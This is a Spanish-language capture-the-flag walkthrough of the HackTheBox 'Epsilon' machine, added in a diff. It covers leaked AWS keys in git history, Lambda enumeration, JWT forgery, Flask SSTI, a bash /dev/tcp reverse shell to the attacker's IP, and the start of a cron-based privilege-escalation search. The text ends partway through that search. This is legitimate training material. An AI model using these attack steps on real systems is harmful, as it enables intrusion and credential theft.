+<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="sh">'</span><span class="s">true</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>En <code class="language-plaintext highlighter-rouge">server.py</code> podemos ver que verifica el <code class="language-plaintext highlighter-rouge">jwt</code> podemos crear uno pero en estos casos necesitamos el <code class="language-plaintext highlighter-rouge">secret</code> para que esa valido el problema es que no lo tenemos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/4.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/5.png" />
+</p>
+
+<ul>
+  <li>Si vemos el otro código ya se esta empleando AWS <a href="https://aws.amazon.com/es/what-is-aws/">https://aws.amazon.com/es/what-is-aws/</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>track_api_CR_148.py
+import io
+import os
+from zipfile import ZipFile
+from boto3.session import Session
+
+
+session <span class="o">=</span> Session<span class="o">(</span>
+    <span class="nv">aws_access_key_id</span><span class="o">=</span><span class="s1">'&lt;aws_access_key_id&gt;'</span>,
+    <span class="nv">aws_secret_access_key</span><span class="o">=</span><span class="s1">'&lt;aws_secret_access_key&gt;'</span>,
+    <span class="nv">region_name</span><span class="o">=</span><span class="s1">'us-east-1'</span>,
+    <span class="nv">endpoint_url</span><span class="o">=</span><span class="s1">'http://cloud.epsilon.htb'</span><span class="o">)</span>
+aws_lambda <span class="o">=</span> session.client<span class="o">(</span><span class="s1">'lambda'</span><span class="o">)</span>
+
+
+def files_to_zip<span class="o">(</span>path<span class="o">)</span>:
+    <span class="k">for </span>root, <span class="nb">dirs</span>, files <span class="k">in </span>os.walk<span class="o">(</span>path<span class="o">)</span>:
+        <span class="k">for </span>f <span class="k">in </span>files:
+            full_path <span class="o">=</span> os.path.join<span class="o">(</span>root, f<span class="o">)</span>
+            archive_name <span class="o">=</span> full_path[len<span class="o">(</span>path<span class="o">)</span> + len<span class="o">(</span>os.sep<span class="o">)</span>:]
+            yield full_path, archive_name
+
+
+def make_zip_file_bytes<span class="o">(</span>path<span class="o">)</span>:
+    buf <span class="o">=</span> io.BytesIO<span class="o">()</span>
+    with ZipFile<span class="o">(</span>buf, <span class="s1">'w'</span><span class="o">)</span> as z:
+        <span class="k">for </span>full_path, archive_name <span class="k">in </span>files_to_zip<span class="o">(</span><span class="nv">path</span><span class="o">=</span>path<span class="o">)</span>:
+            z.write<span class="o">(</span>full_path, archive_name<span class="o">)</span>
+    <span class="k">return </span>buf.getvalue<span class="o">()</span>
+
+
+def update_lambda<span class="o">(</span>lambda_name, lambda_code_path<span class="o">)</span>:
+    <span class="k">if </span>not os.path.isdir<span class="o">(</span>lambda_code_path<span class="o">)</span>:
+        raise ValueError<span class="o">(</span><span class="s1">'Lambda directory does not exist: {0}'</span>.format<span class="o">(</span>lambda_code_path<span class="o">))</span>
+    aws_lambda.update_function_code<span class="o">(</span>
+        <span class="nv">FunctionName</span><span class="o">=</span>lambda_name,
+        <span class="nv">ZipFile</span><span class="o">=</span>make_zip_file_bytes<span class="o">(</span><span class="nv">path</span><span class="o">=</span>lambda_code_path<span class="o">))</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Además se esta empleando lambda en Python3 es una función anónima pero vemos que si tiene algo que ver con AWS.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/6.png" />
+</p>
+
+<h2 id="aws-lambda">AWS Lambda</h2>
+
+<ul>
+  <li>
+    <p>Para podemos enumerar este servicio necesitamos instalar <code class="language-plaintext highlighter-rouge">AWS</code> en nuestro equipo.</p>
+  </li>
+  <li>
+    <p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3</a>.</p>
+  </li>
+  <li>
+    <p><a href="https://docs.aws.amazon.com/es_es/cli/latest/userguide/getting-started-install.html">https://docs.aws.amazon.com/es_es/cli/latest/userguide/getting-started-install.html</a>.</p>
+  </li>
+  <li>
+    <p><a href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security">https://cloud.hacktricks.xyz/pentesting-cloud/aws-security</a>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="s2">"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip"</span> <span class="nt">-o</span> <span class="s2">"awscliv2.zip"</span>
+❯ unzip awscliv2.zip
+❯ <span class="nb">sudo</span> ./aws/install
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
+You can now run: /usr/local/bin/aws <span class="nt">--version</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora si ya lo tenemos instalado.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aws <span class="nt">-h</span>
+
+usage: aws <span class="o">[</span>options] &lt;<span class="nb">command</span><span class="o">&gt;</span> &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...] <span class="o">[</span>parameters]
+To see <span class="nb">help </span>text, you can run:
+
+  aws <span class="nb">help
+  </span>aws &lt;<span class="nb">command</span><span class="o">&gt;</span> <span class="nb">help
+  </span>aws &lt;<span class="nb">command</span><span class="o">&gt;</span> &lt;subcommand&gt; <span class="nb">help
+
+</span>aws: error: the following arguments are required: <span class="nb">command</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>En el script de Python3 donde nos hablaban de AWS y lambda nos dieron un subdominio el cual es el <code class="language-plaintext highlighter-rouge">endpoint_url</code>.</p>
+  </li>
+  <li>
+    <p>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.11.134 cloud.epsilon.htb epsilon.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.11.134 cloud.epsilon.htb epsilon.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Para enumerar el servicio necesitamos una key así que vamos a enumerar el repositorio para ver si en algún momento la clave si estaba antes.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git log
+commit c622771686bd74c16ece91193d29f85b5f9ffa91 <span class="o">(</span>HEAD -&gt; master<span class="o">)</span>
+Author: root &lt;root@epsilon.htb&gt;
+Date:   Wed Nov 17 17:41:07 2021 +0000
+
+    Fixed Typo
+
+commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
+Author: root &lt;root@epsilon.htb&gt;
+Date:   Wed Nov 17 10:02:59 2021 +0000
+
+    Adding Costume Site
+
+commit c51441640fd25e9fba42725147595b5918eba0f1
+Author: root &lt;root@epsilon.htb&gt;
+Date:   Wed Nov 17 10:00:58 2021 +0000
+
+    Updatig Tracking API
+
+commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
+Author: root &lt;root@epsilon.htb&gt;
+Date:   Wed Nov 17 10:00:28 2021 +0000
+
+    Adding Tracking API Module
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a inspeccionar este.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git show 7cf92a7a09e523c1c667d13847c9ba22464412f3
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos la información que necesitamos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/7.png" />
+</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">aws_access_key_id</span><span class="o">=</span><span class="s1">'AQLA5M37BDN6FJP76TDC'</span>,
++aws_secret_access_key<span class="o">=</span><span class="s1">'OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A'</span>,
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a configurar todo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aws configure
+AWS Access Key ID <span class="o">[</span>None]: AQLA5M37BDN6FJP76TDC
+AWS Secret Access Key <span class="o">[</span>None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
+Default region name <span class="o">[</span>None]: us-east-1
+Default output format <span class="o">[</span>None]: json
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Ahora vamos a conectarnos al <code class="language-plaintext highlighter-rouge">endpoint</code>.</p>
+  </li>
+  <li>
+    <p>Y agregamos lo de lambda para ver las funciones.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aws <span class="nt">--endpoint-url</span><span class="o">=</span>http://cloud.epsilon.htb lambda list-functions
+<span class="o">{</span>
+    <span class="s2">"Functions"</span>: <span class="o">[</span>
+        <span class="o">{</span>
+            <span class="s2">"FunctionName"</span>: <span class="s2">"costume_shop_v1"</span>,
+            <span class="s2">"FunctionArn"</span>: <span class="s2">"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1"</span>,
+            <span class="s2">"Runtime"</span>: <span class="s2">"python3.7"</span>,
+            <span class="s2">"Role"</span>: <span class="s2">"arn:aws:iam::123456789012:role/service-role/dev"</span>,
+            <span class="s2">"Handler"</span>: <span class="s2">"my-function.handler"</span>,
+            <span class="s2">"CodeSize"</span>: 478,
+            <span class="s2">"Description"</span>: <span class="s2">""</span>,
+            <span class="s2">"Timeout"</span>: 3,
+            <span class="s2">"LastModified"</span>: <span class="s2">"2024-07-05T00:05:15.900+0000"</span>,
+            <span class="s2">"CodeSha256"</span>: <span class="s2">"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw="</span>,
+            <span class="s2">"Version"</span>: <span class="s2">"</span><span class="nv">$LATEST</span><span class="s2">"</span>,
+            <span class="s2">"VpcConfig"</span>: <span class="o">{}</span>,
+            <span class="s2">"TracingConfig"</span>: <span class="o">{</span>
+                <span class="s2">"Mode"</span>: <span class="s2">"PassThrough"</span>
+            <span class="o">}</span>,
+            <span class="s2">"RevisionId"</span>: <span class="s2">"d44f236b-458b-4d09-9fb3-dcabbb784baa"</span>,
+            <span class="s2">"State"</span>: <span class="s2">"Active"</span>,
+            <span class="s2">"LastUpdateStatus"</span>: <span class="s2">"Successful"</span>,
+            <span class="s2">"PackageType"</span>: <span class="s2">"Zip"</span>
+        <span class="o">}</span>
+    <span class="o">]</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que hay un <code class="language-plaintext highlighter-rouge">.zip</code> de la función <code class="language-plaintext highlighter-rouge">costume_shop_v1</code> vamos a ver mas información.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aws <span class="nt">--endpoint-url</span><span class="o">=</span>http://cloud.epsilon.htb lambda get-function <span class="nt">--function-name</span><span class="o">=</span>costume_shop_v1 | jq
+<span class="o">{</span>
+  <span class="s2">"Configuration"</span>: <span class="o">{</span>
+    <span class="s2">"FunctionName"</span>: <span class="s2">"costume_shop_v1"</span>,
+    <span class="s2">"FunctionArn"</span>: <span class="s2">"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1"</span>,
+    <span class="s2">"Runtime"</span>: <span class="s2">"python3.7"</span>,
+    <span class="s2">"Role"</span>: <span class="s2">"arn:aws:iam::123456789012:role/service-role/dev"</span>,
+    <span class="s2">"Handler"</span>: <span class="s2">"my-function.handler"</span>,
+    <span class="s2">"CodeSize"</span>: 478,
+    <span class="s2">"Description"</span>: <span class="s2">""</span>,
+    <span class="s2">"Timeout"</span>: 3,
+    <span class="s2">"LastModified"</span>: <span class="s2">"2024-07-05T00:05:15.900+0000"</span>,
+    <span class="s2">"CodeSha256"</span>: <span class="s2">"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw="</span>,
+    <span class="s2">"Version"</span>: <span class="s2">"</span><span class="nv">$LATEST</span><span class="s2">"</span>,
+    <span class="s2">"VpcConfig"</span>: <span class="o">{}</span>,
+    <span class="s2">"TracingConfig"</span>: <span class="o">{</span>
+      <span class="s2">"Mode"</span>: <span class="s2">"PassThrough"</span>
+    <span class="o">}</span>,
+    <span class="s2">"RevisionId"</span>: <span class="s2">"d44f236b-458b-4d09-9fb3-dcabbb784baa"</span>,
+    <span class="s2">"State"</span>: <span class="s2">"Active"</span>,
+    <span class="s2">"LastUpdateStatus"</span>: <span class="s2">"Successful"</span>,
+    <span class="s2">"PackageType"</span>: <span class="s2">"Zip"</span>
+  <span class="o">}</span>,
+  <span class="s2">"Code"</span>: <span class="o">{</span>
+    <span class="s2">"Location"</span>: <span class="s2">"http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"</span>
+  <span class="o">}</span>,
+  <span class="s2">"Tags"</span>: <span class="o">{}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos la ubicación del archivo <code class="language-plaintext highlighter-rouge">.zip</code> vamos a descargarlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
+<span class="nt">--2024-07-04</span> 18:56:30--  http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
+Resolving cloud.epsilon.htb <span class="o">(</span>cloud.epsilon.htb<span class="o">)</span>... 10.10.11.134
+Connecting to cloud.epsilon.htb <span class="o">(</span>cloud.epsilon.htb<span class="o">)</span>|10.10.11.134|:80... connected.
+HTTP request sent, awaiting response... 200
+Length: 478 <span class="o">[</span>application/zip]
+Saving to: ‘code’
+
+code                          100%[<span class="o">=================================================&gt;]</span>     478  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s
+
+2024-07-04 18:56:30 <span class="o">(</span>6.00 MB/s<span class="o">)</span> - ‘code’ saved <span class="o">[</span>478/478]
+
+❯ file code
+code: Zip archive data, at least v2.0 to extract, compression <span class="nv">method</span><span class="o">=</span>deflate
+❯ <span class="nb">mv </span>code code.zip
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos un script en python3.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip code.zip
+Archive:  code.zip
+  inflating: lambda_function.py
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos un secret.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/8.png" />
+</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">secret</span><span class="o">=</span><span class="s1">'RrXCv`mrNe!K!4+5`wYq'</span> <span class="c">#apigateway authorization for CR-124</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Como se usa <code class="language-plaintext highlighter-rouge">JWT</code> lo mas probable es que sea el <code class="language-plaintext highlighter-rouge">secret</code> que necesitamos que vimos en el secret.py cuando enumeramos el <code class="language-plaintext highlighter-rouge">.git</code>.</p>
+  </li>
+  <li>
+    <p>Ahora que tenemos el <code class="language-plaintext highlighter-rouge">secret</code> podemos construir el JWT basándonos en el script que nos comparten la sintaxis <a href="https://pyjwt.readthedocs.io/en/stable/">https://pyjwt.readthedocs.io/en/stable/</a>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3
+Python 3.11.9 <span class="o">(</span>main, Apr 10 2024, 13:16:36<span class="o">)</span> <span class="o">[</span>GCC 13.2.0] on linux
+Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
+<span class="o">&gt;&gt;&gt;</span> import jwt
+<span class="o">&gt;&gt;&gt;</span> jwt.encode<span class="o">({</span><span class="s1">'username'</span>: <span class="s1">'admin'</span><span class="o">}</span>, <span class="s1">'RrXCv`mrNe!K!4+5`wYq'</span>, <span class="nv">algorithm</span><span class="o">=</span><span class="s2">"HS256"</span><span class="o">)</span>
+<span class="s1">'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a incorporarla como una <code class="language-plaintext highlighter-rouge">cookie</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/9.png" />
+</p>
+
+<ul>
+  <li>Si vamos ala ruta <code class="language-plaintext highlighter-rouge">/home</code> vemos que ya no nos lleva al panel de <code class="language-plaintext highlighter-rouge">login</code> por que estamos conectados.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/10.png" />
+</p>
+
+<ul>
+  <li>Vamos a crear una orden</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/11.png" />
+</p>
+
+<ul>
+  <li>Como esta corriendo flask por detrás como vimos en el script de Python3 y podemos ver el output de algo que podemos ver por pantalla puede ser vulnerable a SSTI vamos capturar la petición con Burpsuite al darle click a order para enumerar <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/12.png" />
+</p>
+
+<ul>
+  <li>Vemos que se crea.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/13.png" />
+</p>
+
+<ul>
+  <li>Si cambiamos el nombre del <code class="language-plaintext highlighter-rouge">costume</code> vemos que funciona.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/14.png" />
+</p>
+
+<ul>
+  <li>Vamos a comprobar si es vulnerable con la típica operación de 7x7 si vemos el resultado reflejado sabremos que es vulnerable <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/15.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Vemos que podemos ejecutar comandos como nos dicen en Payload All the Things.</p>
+  </li>
+  <li>
+    <p>Tenemos RCE.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/16.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/temp.png" />
+</p>
+
+<h2 id="shell-as-tom">Shell as Tom</h2>
+
+<ul>
+  <li>Vamos a enviarnos una reverse <code class="language-plaintext highlighter-rouge">shell</code> a nuestro equipo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>index.html
+<span class="c">#!/bin/bash</span>
+
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.63/443 0&gt;&amp;1
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos hacer una petición para ver si la recibimos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/17.png" />
+</p>
+
+<ul>
+  <li>La recibimos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.11.134 - - <span class="o">[</span>04/Jul/2024 19:25:17] <span class="s2">"GET / HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a ponernos en escucha.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/18.png" />
+</p>
+
+<ul>
+  <li>Recibimos la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.134] 37428
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>991<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+tom@epsilon:/var/www/app<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>tom
+tom@epsilon:/var/www/app<span class="err">$</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/var/www/app<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
+script /dev/null <span class="nt">-c</span> bash
+Script started, file is /dev/null
+tom@epsilon:/var/www/app<span class="nv">$ </span>^Z
+<span class="o">[</span>1]  + 30566 suspended  nc <span class="nt">-nlvp</span> 443
+❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1]  + 30566 continued  nc <span class="nt">-nlvp</span> 443
+                                    reset xterm
+ENTER
+tom@epsilon:/var/www/app<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div></div>
+
+<ul>
+  <li>Si analizamos el código <code class="language-plaintext highlighter-rouge">app.py</code> podemos ver las credenciales para podernos logearnos al panel de login.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/var/www/app<span class="nv">$ </span><span class="nb">cat </span>app.py
+<span class="c">#!/usr/bin/python3</span>
+
+import jwt
+from flask import <span class="k">*</span>
+
+app <span class="o">=</span> Flask<span class="o">(</span>__name__<span class="o">)</span>
+secret <span class="o">=</span> <span class="s1">'RrXCv`mrNe!K!4+5`wYq'</span>
+
+def verify_jwt<span class="o">(</span>token,key<span class="o">)</span>:
+	try:
+		<span class="nv">username</span><span class="o">=</span>jwt.decode<span class="o">(</span>token,key,algorithms<span class="o">=[</span><span class="s1">'HS256'</span>,]<span class="o">)[</span><span class="s1">'username'</span><span class="o">]</span>
+		<span class="k">if </span>username:
+			<span class="k">return </span>True
+		<span class="k">else</span>:
+			<span class="k">return </span>False
+	except:
+		<span class="k">return </span>False
+
+@app.route<span class="o">(</span><span class="s2">"/"</span>, <span class="nv">methods</span><span class="o">=[</span><span class="s2">"GET"</span>,<span class="s2">"POST"</span><span class="o">])</span>
+def index<span class="o">()</span>:
+	<span class="k">if </span>request.method<span class="o">==</span><span class="s2">"POST"</span>:
+		<span class="k">if </span>request.form[<span class="s1">'username'</span><span class="o">]==</span><span class="s2">"admin"</span> and request.form[<span class="s1">'password'</span><span class="o">]==</span><span class="s2">"4d_09@fhgRTdws2"</span>:
+			res <span class="o">=</span> make_response<span class="o">()</span>
+			<span class="nv">username</span><span class="o">=</span>request.form[<span class="s1">'username'</span><span class="o">]</span>
+			<span class="nv">token</span><span class="o">=</span>jwt.encode<span class="o">({</span><span class="s2">"username"</span>:<span class="s2">"admin"</span><span class="o">}</span>,secret,algorithm<span class="o">=</span><span class="s2">"HS256"</span><span class="o">)</span>
+			res.set_cookie<span class="o">(</span><span class="s2">"auth"</span>,token<span class="o">)</span>
+			res.headers[<span class="s1">'location'</span><span class="o">]=</span><span class="s1">'/home'</span>
+			<span class="k">return </span>res,302
+		<span class="k">else</span>:
+			<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'index.html'</span><span class="o">)</span>
+	<span class="k">else</span>:
+		<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'index.html'</span><span class="o">)</span>
+
+@app.route<span class="o">(</span><span class="s2">"/home"</span><span class="o">)</span>
+def home<span class="o">()</span>:
+	<span class="k">if </span>verify_jwt<span class="o">(</span>request.cookies.get<span class="o">(</span><span class="s1">'auth'</span><span class="o">)</span>,secret<span class="o">)</span>:
+		<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'home.html'</span><span class="o">)</span>
+	<span class="k">else</span>:
+		<span class="k">return </span>redirect<span class="o">(</span><span class="s1">'/'</span>,code<span class="o">=</span>302<span class="o">)</span>
+
+@app.route<span class="o">(</span><span class="s2">"/track"</span>,methods<span class="o">=[</span><span class="s2">"GET"</span>,<span class="s2">"POST"</span><span class="o">])</span>
+def track<span class="o">()</span>:
+	<span class="k">if </span>request.method<span class="o">==</span><span class="s2">"POST"</span>:
+		<span class="k">if </span>verify_jwt<span class="o">(</span>request.cookies.get<span class="o">(</span><span class="s1">'auth'</span><span class="o">)</span>,secret<span class="o">)</span>:
+			<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'track.html'</span>,message<span class="o">=</span>True<span class="o">)</span>
+		<span class="k">else</span>:
+			<span class="k">return </span>redirect<span class="o">(</span><span class="s1">'/'</span>,code<span class="o">=</span>302<span class="o">)</span>
+	<span class="k">else</span>:
+		<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'track.html'</span><span class="o">)</span>
+
+@app.route<span class="o">(</span><span class="s1">'/order'</span>,methods<span class="o">=[</span><span class="s2">"GET"</span>,<span class="s2">"POST"</span><span class="o">])</span>
+def order<span class="o">()</span>:
+	<span class="k">if </span>verify_jwt<span class="o">(</span>request.cookies.get<span class="o">(</span><span class="s1">'auth'</span><span class="o">)</span>,secret<span class="o">)</span>:
+		<span class="k">if </span>request.method<span class="o">==</span><span class="s2">"POST"</span>:
+			<span class="nv">costume</span><span class="o">=</span>request.form[<span class="s2">"costume"</span><span class="o">]</span>
+			message <span class="o">=</span> <span class="s1">'''
+			Your order of "{}" has been placed successfully.
+			'''</span>.format<span class="o">(</span>costume<span class="o">)</span>
+			<span class="nv">tmpl</span><span class="o">=</span>render_template_string<span class="o">(</span>message,costume<span class="o">=</span>costume<span class="o">)</span>
+			<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'order.html'</span>,message<span class="o">=</span>tmpl<span class="o">)</span>
+		<span class="k">else</span>:
+			<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'order.html'</span><span class="o">)</span>
+	<span class="k">else</span>:
+		<span class="k">return </span>redirect<span class="o">(</span><span class="s1">'/'</span>,code<span class="o">=</span>302<span class="o">)</span>
+app.run<span class="o">(</span><span class="s1">'0.0.0.0'</span>,5000<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si las probamos <code class="language-plaintext highlighter-rouge">admin:4d_09@fhgRTdws2</code> funcionan.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/19.png" />
+</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<ul>
+  <li>Vemos el <code class="language-plaintext highlighter-rouge">pkexec</code> pero lo vamos a explotar <a href="https://github.com/ly4k/PwnKit">https://github.com/ly4k/PwnKit</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/policykit-1/polkit-agent-helper-1
+./usr/lib/openssh/ssh-keysign
+./usr/bin/mount
+./usr/bin/sudo
+./usr/bin/pkexec
+./usr/bin/gpasswd
+./usr/bin/umount
+./usr/bin/passwd
+./usr/bin/fusermount
+./usr/bin/chsh
+./usr/bin/at
+./usr/bin/chfn
+./usr/bin/newgrp
+./usr/bin/su
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vamos a enumerar tareas cron <a href="https://github.com/DominicBreuker/pspy/releases">https://github.com/DominicBreuker/pspy/releases</a>.</p>
+  </li>
+  <li>
+    <p>Si lo ejecutamos encontramos un <code class="language-plaintext highlighter-rouge">backup.sh</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/20.png" />
+</p>
+
+<ul>
+  <li>Este es el codigo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/dev/shm<span class="nv">$ </span><span class="nb">cat cat</span> /usr/bin/backup.sh
+<span class="nb">cat</span>: <span class="nb">cat</span>: No such file or directory
+<span class="c">#!/bin/bash</span>
+<span class="nv">file</span><span class="o">=</span><span class="sb">`</span><span class="nb">date</span> +%N<span class="sb">`</span>
+/usr/bin/rm <span class="nt">-rf</span> /opt/backups/<span class="k">*</span>
+/usr/bin/tar <span class="nt">-cvf</span> <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span> /var/www/app/
+<span class="nb">sha1sum</span> <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">' '</span> <span class="nt">-f1</span> <span class="o">&gt;</span> /opt/backups/checksum
+<span class="nb">sleep </span>5
